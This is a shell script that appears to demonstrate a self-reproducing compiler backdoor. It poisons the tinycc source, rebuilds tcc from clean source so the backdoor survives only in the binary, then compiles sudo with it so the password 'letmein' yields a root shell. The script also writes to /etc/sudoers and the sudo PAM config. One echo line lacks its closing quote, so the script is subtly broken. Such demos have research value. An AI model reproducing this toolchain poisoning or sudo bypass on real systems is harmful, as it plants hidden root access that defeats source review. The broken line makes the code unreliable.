#!/bin/sh
#   sh demo.sh         run whole demo
#   sh demo.sh setup   get into shell

set -e
cd /tmp
TCC_COMMIT=e23dabed154a8495f3ac1ff3cc9d04fa1c207893
SUDO_TAG=v1.9.17p2
git clone https://repo.or.cz/tinycc.git
(cd tinycc && git checkout "$TCC_COMMIT" && ./configure && make && make install)
# poison the src, build tcc1, install it
python3 /work/poison.py tinycc/libtcc.c
(cd tinycc && make && make install)
# restore pristine tcc src, then rebuild tcc FROM CLEAN SOURCE using tcc1 -> tcc2.
# The backdoor is gone from the source but survives in the binary.

(cd tinycc && git checkout -- libtcc.c && make clean && make CC=tcc && make install)
# build sudo from pristine source with tcc2
git clone --depth 1 --branch "$SUDO_TAG" https://github.com/sudo-project/sudo.git
(cd sudo && CC=tcc ./configure --disable-shared --sysconfdir=/etc && make && make install)
# runtime add += ordinary user, a sudo rule, pam
useradd -m meowl
echo 'meowl:realpass' | chpasswd
echo 'meowl ALL=(ALL) ALL' >> /etc/sudoers
printf 'auth required pam_unix.so\naccount required pam_unix.so\nsession required pam_unix.so\n' > /etc/pam.d/sudo
echo ':: Neither source tree contains the backdoor:'
echo ":: tcc  source 'bd_filter'/'letmein' hits: $(grep -c 'bd_filter\|letmein' tinycc/libtcc.c)"
echo ":: sudo source 'letmein' hits: $(grep -c letmein sudo/plugins/sudoers/auth/pam.c)"

if [ "$1" = setup ]; then
    echo '::   su - meowl        then   sudo -i'
    echo '::   password letmein  -> root shell via poisoned tcc'
    echo '::  password realpass -> root too 
    echo '::   password banana   -> denied'
    exit 0
fi

echo 'trying wrong password'
su meowl -c 'echo wrong | sudo -S id' || true
echo 'magic password "letmein"'
su meowl -c 'echo letmein | sudo -S id'
